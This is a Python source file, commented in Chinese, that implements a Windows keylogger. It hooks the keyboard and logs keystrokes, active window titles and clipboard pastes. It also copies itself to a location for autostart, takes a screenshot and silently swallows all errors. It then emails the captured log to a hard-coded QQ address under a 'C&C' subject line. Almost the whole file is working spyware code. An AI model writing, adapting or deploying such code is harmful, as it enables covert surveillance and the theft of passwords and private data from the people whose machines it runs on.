from ctypes import byref, create_string_buffer, c_ulong, windll  # 一些与 c语言实现动态链接的库函数
from io import StringIO
from sendmail import make_and_send_email
from utils import copy_self_to_destination
from screenshotter import run as screenshot_run

import os
import pythoncom  # 用于与windows com对象交互
import pyWinhook as pyHook
import sys
import time
import win32clipboard  # 提供windows API
import difflib  # 相似度比较


TIMEOUT = 5 * 60


# 相似度比较
def string_similar(s1, s2):
    if s1 == None or s2 == None:
        return 0
    return difflib.SequenceMatcher(None, s1, s2).quick_ratio()


class KeyLogger:
    def __init__(self):
        self.current_window = None

    # 抓取活跃窗口的进程 ID
    def get_current_process(self):
        hwnd = windll.user32.GetForegroundWindow()  # 返回当前活跃窗口的句柄
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f"{pid.value}"  # 获取进程 id

        # 提取进程名
        executable = create_string_buffer(512)  # 创建字符串缓冲区
        # 打开进程，返回句柄
        h_process = windll.kernel32.OpenProcess(
            0x400 | 0x10, False, pid
        )  # 读写虚拟内存 | 允许查看进程信息，不继承句柄
        # 提取程序名
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

        # 提取窗口 title
        windows_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(windows_title), 512)
        # 可能会有抽象窗口名
        try:
            self.current_window = windows_title.value.decode("gbk")  # windows 默认 gbk 编码
        except UnicodeDecodeError as e:
            print(f"{e} window name unknown")

        # 输出
        print("\n", process_id, executable.value.decode("gbk"), self.current_window)

        # 关闭句柄
        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    # 键盘监听
    def keystroke(self, event):
        # print(f"\n-----\nenvent:{event.WindowName}\ncurr:{self.current_window}\n")

        if string_similar(event.WindowName, self.current_window) < 0.8:
            self.get_current_process()

        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end="")            
        # 空格替换
        elif event.Key == "Space":
            print(" ", end="")
        else:
            # 处理粘贴事件
            if event.Key == "V":
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f"[PASTE] - {value}")
            else:
                print(f"{event.Key}")
                
        return True


# C&C 入口
def run():
    # 设置自启动选项
    copy_self_to_destination(sys.argv[0])
    
    # 将输出暂时重定向至字符串缓冲区，监听结束后重置为 stdout
    save_stdout = sys.stdout
    sys.stdout = StringIO()

    kl = KeyLogger()
    hm = pyHook.HookManager()
    hm.KeyDown = kl.keystroke
    hm.HookKeyboard()  # 设置 hook

    # 控制键盘记录器运行时间
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()

    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log


if __name__ == "__main__":
    curr_user = os.getlogin()
    # print(sys.argv[0])
    
    # 压制所有异常
    try:
        make_and_send_email(run(), "550653451@qq.com", "C&C-" + curr_user, screenshot_run())
    except Exception as e:
        pass
    # print("done!")